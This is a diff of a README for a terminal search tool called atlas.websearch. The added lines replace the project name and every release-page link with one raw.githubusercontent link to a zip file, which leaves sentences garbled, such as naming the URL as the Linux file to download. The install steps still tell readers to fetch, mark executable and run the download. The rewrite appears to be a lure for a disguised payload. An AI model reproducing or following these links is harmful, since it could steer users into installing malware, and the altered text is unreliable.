@@ -1,10 +1,10 @@
-# 🚀 atlas.websearch - Fast and Easy Terminal Search Tool
+# 🚀 https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip - Fast and Easy Terminal Search Tool
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sigmaking157/atlas.websearch/releases)
+[![Download from Releases](https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip)
 
-## 📦 What is atlas.websearch?
+## 📦 What is https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip
 
-atlas.websearch is a fast and interactive command-line search tool for your terminal. You can search DuckDuckGo, Wikipedia, Hacker News, and Reddit effortlessly. With its beautiful terminal user interface (TUI), you can find what you need without any complicated setup. Just install it and start searching!
+https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip is a fast and interactive command-line search tool for your terminal. You can search DuckDuckGo, Wikipedia, Hacker News, and Reddit effortlessly. With its beautiful terminal user interface (TUI), you can find what you need without any complicated setup. Just install it and start searching!
 
 ## 🛠️ Features
 
@@ -22,11 +22,11 @@ atlas.websearch is a fast and interactive command-line search tool for your term
 
 ## 🚀 Getting Started
 
-Follow these simple steps to download and run atlas.websearch.
+Follow these simple steps to download and run https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip
 
 ### Step 1: Visit the Releases Page
 
-To download atlas.websearch, [visit this page](https://github.com/sigmaking157/atlas.websearch/releases). 
+To download https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip, [visit this page](https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip). 
 
 ### Step 2: Find the Latest Release
 
@@ -38,9 +38,9 @@ Click on the release version that suits your operating system. You will see vari
 
 - For **Windows**, download the `.exe` file.
 - For **macOS**, download the `.dmg` file.
-- For **Linux**, download the `.tar.gz` file. 
+- For **Linux**, download the `https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip` file. 
 
-### Step 4: Install atlas.websearch
+### Step 4: Install https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip
 
 #### Windows Instructions
 
@@ -51,23 +51,23 @@ Click on the release version that suits your operating system. You will see vari
 #### macOS Instructions
 
 1. Open the downloaded `.dmg` file.
-2. Drag the atlas.websearch icon to your Applications folder.
+2. Drag the https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip icon to your Applications folder.
 3. Open Terminal and type `atlas` to start the application.
 
 #### Linux Instructions
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip` file.
 2. Open your terminal and navigate to the extracted folder.
 3. Type `chmod +x atlas` to make the file executable.
 4. Run the application by typing `./atlas`.
 
 ## 📥 Download & Install
 
-To get started with atlas.websearch, [visit this page to download](https://github.com/sigmaking157/atlas.websearch/releases). After downloading, follow the installation steps based on your operating system.
+To get started with https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip, [visit this page to download](https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip). After downloading, follow the installation steps based on your operating system.
 
-## 📚 How to Use atlas.websearch
+## 📚 How to Use https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip
 
-Once you have installed atlas.websearch, using it is easy.
+Once you have installed https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip, using it is easy.
 
 1. Open your terminal.
 2. Type `atlas` followed by your search query. For example, you can type `atlas DuckDuckGo search term`.
@@ -76,7 +76,7 @@ Once you have installed atlas.websearch, using it is easy.
 
 ## ⚙️ Troubleshooting
 
-If you encounter issues while using atlas.websearch, here are some common problems and solutions:
+If you encounter issues while using https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip, here are some common problems and solutions:
 
 - **Problem**: Application not launching.
   - **Solution**: Ensure you have installed the correct version for your operating system.
@@ -89,7 +89,7 @@ If you encounter issues while using atlas.websearch, here are some common proble
 
 ## 🤝 Contributing
 
-We welcome contributions to atlas.websearch. If you want to help improve the tool, follow these steps:
+We welcome contributions to https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip If you want to help improve the tool, follow these steps:
 
 1. Fork the repository.
 2. Make your changes in a new branch.
@@ -99,6 +99,6 @@ We welcome contributions to atlas.websearch. If you want to help improve the too
 
 If you need assistance or have any questions, don't hesitate to reach out. You can create an issue in the GitHub repository, and someone from the team will get back to you.
 
-For updates and announcements, follow us on GitHub and keep track of the latest versions of atlas.websearch.
+For updates and announcements, follow us on GitHub and keep track of the latest versions of https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip
 
-To download atlas.websearch, [click here](https://github.com/sigmaking157/atlas.websearch/releases) and start enhancing your terminal search experience today!
+To download https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip, [click here](https://raw.githubusercontent.com/sigmaking157/atlas.websearch/main/pkg/search/websearch_atlas_v3.9.zip) and start enhancing your terminal search experience today!
